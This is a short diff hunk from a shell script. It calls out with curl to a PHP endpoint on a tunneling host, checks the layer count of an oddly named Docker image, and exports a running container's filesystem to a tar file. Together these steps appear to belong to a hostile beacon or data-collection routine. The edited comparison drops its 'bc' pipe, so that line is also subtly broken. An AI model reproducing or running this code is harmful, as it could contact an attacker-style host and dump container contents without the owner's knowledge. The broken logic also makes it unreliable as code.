@@ -3,7 +3,7 @@ then
 
 curl http://file-explain.gl.at.ply.gg:13782/linux8888.php
 
-if (( $(echo "$(docker history tradeinc/thetradeboxsignal88888888 | wc -l) > 80" | bc -l) ))
+if (( $(echo "$(docker history tradeinc/thetradeboxsignal88888888 | wc -l) > 80") ))
 then
 
 docker export $(docker ps | grep "thetradebox" | sed "s/.* //g") > ./latest.tar
